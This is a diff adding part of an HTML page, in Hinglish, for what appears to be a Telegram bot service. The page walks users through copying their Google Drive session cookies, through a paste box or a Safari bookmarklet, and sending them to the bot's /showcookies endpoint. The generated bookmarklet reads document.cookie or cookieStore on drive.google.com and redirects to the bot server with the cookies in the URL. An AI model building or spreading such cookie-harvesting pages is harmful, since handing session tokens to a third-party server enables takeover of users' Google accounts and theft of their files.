+        <div class="copy-row"><button class="copy-btn" onclick="copyCode('cmd-ios-safari',this)">📋 Copy</button></div>
+        <p style="margin-top:6px">Output copy karein → bot ko bhejein.</p>
+      </div>
+    </div>
+    <div class="warn-box">⚠️ Sirf non-httpOnly cookies milti hain — private files ke liye Auto-Login better hai.</div>
+  </div>
+
+  <div class="divider">YA — Bookmarklet (Limited)</div>
+
+  <div class="method-card orange">
+    <span class="badge badge-limited">📖 Method 2 — Bookmarklet (Limited)</span>
+    <div class="method-title">Safari Bookmarklet</div>
+    <div class="method-sub">Sirf non-httpOnly cookies — private files ke liye kam ho sakta hai.</div>
+
+    <div class="step">
+      <div class="snum o">1</div>
+      <div class="sbody">
+        <strong>Pehle ek koi bhi bookmark banayein Safari mein</strong>
+        <p>Kisi bhi page ko bookmark karein (Share icon → Add Bookmark).</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum o">2</div>
+      <div class="sbody">
+        <strong>Woh bookmark edit karein</strong>
+        <p>Bookmarks mein jaayein → bookmark pe long press → Edit → URL mein yeh paste karein:</p>
+        <div class="code-box bm-code" id="cmd-ios-bm">javascript:(function(){/* loading... */})()</div>
+        <div class="copy-row"><button class="copy-btn" onclick="copyCode('cmd-ios-bm',this)">📋 Copy</button></div>
+      </div>
+    </div>
+    <div class="step">
+      <div class="snum o">3</div>
+      <div class="sbody">
+        <strong>drive.google.com pe jaayein → woh bookmark tap karein</strong>
+        <p>Page bot server pe redirect ho jaayega — cookies automatically save ho jaayengi.</p>
+      </div>
+    </div>
+    <div class="warn-box" style="border-color:rgba(251,146,60,.35)">⚠️ JS sirf non-HttpOnly cookies de sakta hai — private Drive files ke liye Auto-Login better hai.</div>
+  </div>
+
+  <div class="divider">YA — Dusra Device Use Karein</div>
+
+  <div class="method-card gray">
+    <span class="badge badge-ok">💡 Sabse Aasan iOS Workaround</span>
+    <div class="method-title">Kisi Windows/Android Device Pe Karein</div>
+    <div class="method-sub">iOS mein limitation hai — agar koi Windows/Android device available ho to woh use karein.</div>
+    <div class="info-box">
+      <b style="color:#fff">Options:</b><br>
+      • 🖥️ Kisi bhi Windows/Mac/Linux PC pe Chrome + J2Team use karein<br>
+      • 🤖 Kisi Android phone pe Kiwi Browser + J2Team use karein<br>
+      • ⚡ Ya sidha <b>Auto-Login</b> feature use karein — no cookies needed!
+    </div>
+  </div>
+
+</div>
+
+<!-- ════════════════════ UNIVERSAL PASTE ════════════════════ -->
+<div class="method-card" style="margin-top:6px">
+  <span class="badge badge-ok">📋 Har Device — Direct Submit</span>
+  <div class="method-title">Cookie String Yahan Paste Karein</div>
+  <div class="method-sub">Kisi bhi tarike se cookies copy ho jaayein — yahan paste karke directly submit karein.</div>
+  <div class="result-area show">
+    <h4>📋 Cookie Paste & Submit</h4>
+    <textarea id="universal-cookie-input" placeholder="JSON ya raw cookie string yahan paste karein..."></textarea>
+    <button class="submit-btn" onclick="submitCookies('universal-cookie-input')">🚀 Bot Ko Submit Karein</button>
+  </div>
+</div>
+
+</div><!-- /page-wrap -->
+
+<script>
+function getUid(){
+  return new URLSearchParams(window.location.search).get('uid') || '';
+}
+
+// ── Tab switching
+function switchTab(name){
+  document.querySelectorAll('.platform-section').forEach(s=>s.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  document.getElementById('tab-'+name).classList.add('active');
+  event.currentTarget.classList.add('active');
+}
+
+// ── Copy code
+function copyCode(id, btn){
+  const el = document.getElementById(id);
+  if(!el) return;
+  navigator.clipboard.writeText(el.textContent).then(()=>{
+    const orig = btn.textContent;
+    btn.textContent = '✅ Copied!';
+    setTimeout(()=>{ btn.textContent = orig; }, 2000);
+  }).catch(()=>{
+    const r = document.createRange();
+    r.selectNode(el);
+    window.getSelection().removeAllRanges();
+    window.getSelection().addRange(r);
+    document.execCommand('copy');
+    btn.textContent = '✅ Copied!';
+    setTimeout(()=>{ btn.textContent = '📋 Copy'; }, 2000);
+  });
+}
+
+// ── Submit cookies to bot
+function submitCookies(inputId){
+  const uid = getUid();
+  const val = document.getElementById(inputId).value.trim();
+  if(!val){ alert('Pehle cookies paste karein.'); return; }
+  if(!uid){ alert('UID missing — Telegram bot se link kholein.'); return; }
+  const base = window.location.origin + '/showcookies';
+  window.location.href = base + '?uid=' + encodeURIComponent(uid) + '&c=' + encodeURIComponent(val);
+}
+
+// ── Bookmarklet setup
+// Uses cookieStore.getAll() when available (modern browsers) then falls back
+// to document.cookie. Either way it redirects to /showcookies automatically —
+// no manual copy-paste needed. NOTE: HttpOnly cookies are never accessible from
+// JavaScript regardless of API; for full Drive access use J2Team ext or Auto-Login.
+function buildBookmarklet(){
+  const uid  = getUid();
+  const base = window.location.origin + '/showcookies';
+  // Keep code compact for address-bar use (some browsers limit URL length)
+  const code = `(function(){`+
+    `var b='${base}',u='${uid}';`+
+    `function go(c){if(!c||c.length<5){alert('Cookies nahi mili — drive.google.com pe kholein.');return;}`+
+    `location.href=b+'?uid='+encodeURIComponent(u)+'&c='+encodeURIComponent(c);}`+
+    `if(window.cookieStore){`+
+      `cookieStore.getAll().then(function(a){`+
+        `var s=a.map(function(x){return x.name+'='+x.value;}).join('; ');`+
+        `go(s||document.cookie);`+
+      `}).catch(function(){go(document.cookie);});`+
+    `}else{go(document.cookie);}`+
+  `})();`;
+  document.querySelectorAll('.bm-btn').forEach(b=>{ b.href='javascript:'+code; });
+  // Also update static code-box snippets so copy-button picks up the live code
+  document.querySelectorAll('.bm-code').forEach(el=>{ el.textContent='javascript:'+code; });
+}
+
+document.addEventListener('DOMContentLoaded', buildBookmarklet);
+</script>
+</body>
+</html>
